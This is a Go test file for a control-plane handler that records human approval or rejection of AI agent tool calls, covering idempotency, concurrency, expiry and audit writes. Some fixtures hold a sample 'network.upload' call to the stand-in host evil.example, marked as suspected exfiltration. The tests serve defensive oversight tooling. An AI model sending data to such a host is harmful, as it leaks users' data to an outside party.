package handler

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"

	"github.com/yangjiyj/aiguard/apps/control-plane/internal/repository"
)

// HITL 批准只登记“等待客户端重试”，中心端没有本地工具执行通道。
// 只有登记失败才标 failed；驳回绝不能写批准审计。

// fakeConfirmationReplayer 记录是否被调用、收到的确认上下文，模拟生产重放器。
type fakeConfirmationReplayer struct {
	mu            sync.Mutex
	called        int
	lastConf      *repository.AgentGuardConfirmation
	returnedLogID string
	returnedErr   error
}

func (f *fakeConfirmationReplayer) ReplayConfirmation(_ context.Context, c *repository.AgentGuardConfirmation) (string, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.called++
	f.lastConf = c
	if f.returnedLogID == "" {
		f.returnedLogID = "tc_replayed"
	}
	return f.returnedLogID, f.returnedErr
}

func (f *fakeConfirmationReplayer) callCount() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.called
}

// MarkConfirmationReplayed 让 fake repo 满足扩展后的 AgentGuardPolicyRepo 接口。
func (f *fakeAgentGuardPolicyRepo) MarkConfirmationReplayed(_ context.Context, tenantID, id, replayStatus, toolLogID string) error {
	f.confirmationMu.Lock()
	defer f.confirmationMu.Unlock()
	if f.markConfirmationErr != nil {
		return f.markConfirmationErr
	}
	c := f.confirmations[id]
	if c == nil || c.TenantID != tenantID || c.Status != "approved" {
		return repository.ErrAgentGuardConfirmationReplayStateNotUpdated
	}
	c.ReplayStatus = replayStatus
	c.ReplayToolLogID = toolLogID
	now := time.Now()
	c.ReplayedAt = &now
	return nil
}

func TestResolveAgentGuardConfirmationApprovedWaitsForClientRetry(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID:          "tenant-a",
		TraceID:           "trace-1",
		ToolName:          "network.upload",
		ToolCallID:        "call_abc123",
		ToolCallArguments: `{"url":"https://evil.example/upload"}`,
		ChoiceIndex:       0,
		ExpiresAt:         time.Now().Add(time.Minute),
	})
	replayer := &fakeConfirmationReplayer{}
	deps := &Dependencies{
		AgentGuardPolicyRepo: repo,
		SystemRepo:           &agentGuardAuditSystemRepo{},
		ConfirmationReplayer: replayer,
	}
	body := []byte(`{"status":"approved","note":"确认是内部上传"}`)
	req := withAgentGuardUser(httptest.NewRequest(http.MethodPost, "/admin/v1/agentguard/confirmations/agcf_fake/resolve", bytes.NewReader(body)))
	rctx := chi.NewRouteContext()
	rctx.URLParams.Add("id", "agcf_fake")
	req = req.WithContext(context.WithValue(req.Context(), chi.RouteCtxKey, rctx))
	rr := httptest.NewRecorder()

	ResolveAgentGuardConfirmation(deps)(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", rr.Code, rr.Body.String())
	}
	if replayer.called != 1 {
		t.Fatalf("批准后重放器应被调用一次，got %d", replayer.called)
	}
	if replayer.lastConf == nil || replayer.lastConf.ToolCallID != "call_abc123" {
		t.Fatalf("重放器应收到持久化的原始工具上下文，got %#v", replayer.lastConf)
	}
	if got := repo.confirmations["agcf_fake"].ReplayStatus; got != "pending" {
		t.Fatalf("replay_status = %q, want pending while waiting client retry", got)
	}
	if got := repo.confirmations["agcf_fake"].ReplayToolLogID; got == "" {
		t.Fatal("重放成功后 replay_tool_log_id 应被写入")
	}
}

func TestResolveAgentGuardConfirmationReplayFailureMarksFailed(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID: "tenant-a", TraceID: "trace-fail", ToolName: "Bash",
		ToolCallID: "call_fail", ToolCallArguments: `{"command":"echo safe"}`,
		ExpiresAt: time.Now().Add(time.Minute),
	})
	replayer := &fakeConfirmationReplayer{returnedErr: context.DeadlineExceeded}
	deps := &Dependencies{AgentGuardPolicyRepo: repo, SystemRepo: &agentGuardAuditSystemRepo{}, ConfirmationReplayer: replayer}
	req := withAgentGuardUser(httptest.NewRequest(http.MethodPost, "/admin/v1/agentguard/confirmations/agcf_fake/resolve", bytes.NewReader([]byte(`{"status":"approved"}`))))
	rctx := chi.NewRouteContext()
	rctx.URLParams.Add("id", "agcf_fake")
	req = req.WithContext(context.WithValue(req.Context(), chi.RouteCtxKey, rctx))
	rr := httptest.NewRecorder()

	ResolveAgentGuardConfirmation(deps)(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if got := repo.confirmations["agcf_fake"].ReplayStatus; got != "failed" {
		t.Fatalf("replay_status=%q, want failed", got)
	}
	if got := repo.confirmations["agcf_fake"].ReplayToolLogID; got != "" {
		t.Fatalf("replay_tool_log_id=%q, want empty when audit write failed", got)
	}
}

func TestResolveAgentGuardConfirmationRejectedSkipsReplay(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID:          "tenant-a",
		TraceID:           "trace-2",
		ToolName:          "network.upload",
		ToolCallID:        "call_def456",
		ToolCallArguments: `{"url":"https://evil.example/upload"}`,
		ExpiresAt:         time.Now().Add(time.Minute),
	})
	replayer := &fakeConfirmationReplayer{}
	deps := &Dependencies{
		AgentGuardPolicyRepo: repo,
		SystemRepo:           &agentGuardAuditSystemRepo{},
		ConfirmationReplayer: replayer,
	}
	body := []byte(`{"status":"rejected","note":"驳回，疑似外泄"}`)
	req := withAgentGuardUser(httptest.NewRequest(http.MethodPost, "/admin/v1/agentguard/confirmations/agcf_fake/resolve", bytes.NewReader(body)))
	rctx := chi.NewRouteContext()
	rctx.URLParams.Add("id", "agcf_fake")
	req = req.WithContext(context.WithValue(req.Context(), chi.RouteCtxKey, rctx))
	rr := httptest.NewRecorder()

	ResolveAgentGuardConfirmation(deps)(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", rr.Code, rr.Body.String())
	}
	if replayer.called != 0 {
		t.Fatalf("驳回绝不能触发重放，got %d", replayer.called)
	}
}

func resolveAgentGuardConfirmationForTest(deps *Dependencies, status string) *httptest.ResponseRecorder {
	body := []byte(`{"status":"` + status + `"}`)
	req := withAgentGuardUser(httptest.NewRequest(http.MethodPost, "/admin/v1/agentguard/confirmations/agcf_fake/resolve", bytes.NewReader(body)))
	rctx := chi.NewRouteContext()
	rctx.URLParams.Add("id", "agcf_fake")
	req = req.WithContext(context.WithValue(req.Context(), chi.RouteCtxKey, rctx))
	rr := httptest.NewRecorder()
	ResolveAgentGuardConfirmation(deps)(rr, req)
	return rr
}

func TestResolveAgentGuardConfirmationMissingIsNotFound(t *testing.T) {
	deps := &Dependencies{AgentGuardPolicyRepo: newFakeAgentGuardPolicyRepo(), SystemRepo: &agentGuardAuditSystemRepo{}}

	response := resolveAgentGuardConfirmationForTest(deps, "approved")

	if response.Code != http.StatusNotFound {
		t.Fatalf("missing confirmation status=%d, want 404; body=%s", response.Code, response.Body.String())
	}
}

func TestResolveAgentGuardConfirmationRepeatedApprovalIsIdempotent(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID: "tenant-a", TraceID: "trace-repeat", ToolName: "Bash",
		ToolCallID: "call_repeat", ExpiresAt: time.Now().Add(time.Minute),
	})
	replayer := &fakeConfirmationReplayer{}
	auditRepo := &agentGuardAuditSystemRepo{}
	deps := &Dependencies{AgentGuardPolicyRepo: repo, SystemRepo: auditRepo, ConfirmationReplayer: replayer}

	first := resolveAgentGuardConfirmationForTest(deps, "approved")
	second := resolveAgentGuardConfirmationForTest(deps, "approved")

	if first.Code != http.StatusOK || second.Code != http.StatusOK {
		t.Fatalf("same resolution must be idempotent: first=%d %s second=%d %s", first.Code, first.Body.String(), second.Code, second.Body.String())
	}
	if got := replayer.callCount(); got != 1 {
		t.Fatalf("replayer calls=%d, want 1", got)
	}
	if got := auditRepo.auditCount(); got != 2 {
		t.Fatalf("audit writes=%d, want only the fresh resolve and client-retry records", got)
	}
}

func TestResolveAgentGuardConfirmationConcurrentApprovalHasOneFreshResolution(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID: "tenant-a", TraceID: "trace-concurrent", ToolName: "Bash",
		ToolCallID: "call_concurrent", ExpiresAt: time.Now().Add(time.Minute),
	})
	replayer := &fakeConfirmationReplayer{}
	auditRepo := &agentGuardAuditSystemRepo{}
	deps := &Dependencies{AgentGuardPolicyRepo: repo, SystemRepo: auditRepo, ConfirmationReplayer: replayer}

	start := make(chan struct{})
	responses := make(chan *httptest.ResponseRecorder, 2)
	var wg sync.WaitGroup
	for i := 0; i < 2; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-start
			responses <- resolveAgentGuardConfirmationForTest(deps, "approved")
		}()
	}
	close(start)
	wg.Wait()
	close(responses)
	okResponses := 0
	for response := range responses {
		switch response.Code {
		case http.StatusOK:
			okResponses++
		case http.StatusServiceUnavailable:
			if response.Header().Get("Retry-After") == "" {
				t.Fatalf("in-flight evidence linkage must be retryable: body=%s", response.Body.String())
			}
		default:
			t.Fatalf("concurrent same resolution status=%d body=%s", response.Code, response.Body.String())
		}
	}
	if okResponses == 0 {
		t.Fatal("fresh resolver must complete the approval response")
	}
	if got := replayer.callCount(); got != 1 {
		t.Fatalf("concurrent replayer calls=%d, want 1", got)
	}
	if got := auditRepo.auditCount(); got != 2 {
		t.Fatalf("concurrent audit writes=%d, want 2", got)
	}
}

func TestResolveAgentGuardConfirmationDifferentDispositionConflicts(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID: "tenant-a", TraceID: "trace-conflict", ToolName: "Bash",
		ToolCallID: "call_conflict", ExpiresAt: time.Now().Add(time.Minute),
	})
	replayer := &fakeConfirmationReplayer{}
	auditRepo := &agentGuardAuditSystemRepo{}
	deps := &Dependencies{AgentGuardPolicyRepo: repo, SystemRepo: auditRepo, ConfirmationReplayer: replayer}

	first := resolveAgentGuardConfirmationForTest(deps, "approved")
	second := resolveAgentGuardConfirmationForTest(deps, "rejected")

	if first.Code != http.StatusOK || second.Code != http.StatusConflict {
		t.Fatalf("first=%d %s second=%d %s", first.Code, first.Body.String(), second.Code, second.Body.String())
	}
	if got := replayer.callCount(); got != 1 {
		t.Fatalf("replayer calls=%d, want 1", got)
	}
	if got := auditRepo.auditCount(); got != 2 {
		t.Fatalf("audit writes=%d, conflicting request must not add audit", got)
	}
}

func TestResolveAgentGuardConfirmationExpiredDoesNotReplay(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID: "tenant-a", TraceID: "trace-expired", ToolName: "Bash",
		ToolCallID: "call_expired", ExpiresAt: time.Now().Add(-time.Minute),
	})
	replayer := &fakeConfirmationReplayer{}
	auditRepo := &agentGuardAuditSystemRepo{}
	deps := &Dependencies{AgentGuardPolicyRepo: repo, SystemRepo: auditRepo, ConfirmationReplayer: replayer}

	response := resolveAgentGuardConfirmationForTest(deps, "approved")

	if response.Code != http.StatusConflict {
		t.Fatalf("status=%d, want 409; body=%s", response.Code, response.Body.String())
	}
	if got := replayer.callCount(); got != 0 {
		t.Fatalf("expired confirmation replay calls=%d, want 0", got)
	}
	if got := auditRepo.auditCount(); got != 0 {
		t.Fatalf("expired confirmation audit writes=%d, want 0", got)
	}
}

func TestResolveAgentGuardConfirmationMarkFailureRemainsUnavailableWithoutReplay(t *testing.T) {
	repo := newFakeAgentGuardPolicyRepo()
	_ = repo.CreateConfirmation(context.Background(), &repository.AgentGuardConfirmation{
		TenantID: "tenant-a", TraceID: "trace-mark-fail", ToolName: "Bash",
		ToolCallID: "call_mark_fail", ExpiresAt: time.Now().Add(time.Minute),
	})
	repo.markConfirmationErr = context.DeadlineExceeded
	replayer := &fakeConfirmationReplayer{}
	auditRepo := &agentGuardAuditSystemRepo{}
	deps := &Dependencies{AgentGuardPolicyRepo: repo, SystemRepo: auditRepo, ConfirmationReplayer: replayer}

	first := resolveAgentGuardConfirmationForTest(deps, "approved")
	if first.Code != http.StatusServiceUnavailable {
		t.Fatalf("mark failure status=%d, want 503; body=%s", first.Code, first.Body.String())
	}
	if first.Header().Get("Retry-After") == "" {
		t.Fatal("retryable persistence failure must include Retry-After")
	}
	if got := repo.confirmations["agcf_fake"].ReplayToolLogID; got != "" {
		t.Fatalf("response state must not claim unpersisted tool log id %q", got)
	}
	if got := replayer.callCount(); got != 1 {
		t.Fatalf("replayer calls after first request=%d, want 1", got)
	}
	if got := auditRepo.auditCount(); got != 1 {
		t.Fatalf("audit writes after mark failure=%d, want only fresh resolve", got)
	}

	second := resolveAgentGuardConfirmationForTest(deps, "approved")
	if second.Code != http.StatusServiceUnavailable {
		t.Fatalf("incomplete replay linkage status=%d, want 503; body=%s", second.Code, second.Body.String())
	}
	if second.Header().Get("Retry-After") == "" {
		t.Fatal("incomplete replay linkage must remain explicitly retryable")
	}
	if got := replayer.callCount(); got != 1 {
		t.Fatalf("retry must not duplicate confirmation audit, calls=%d", got)
	}
	if got := auditRepo.auditCount(); got != 1 {
		t.Fatalf("retry must not duplicate resolve audit, writes=%d", got)
	}
}
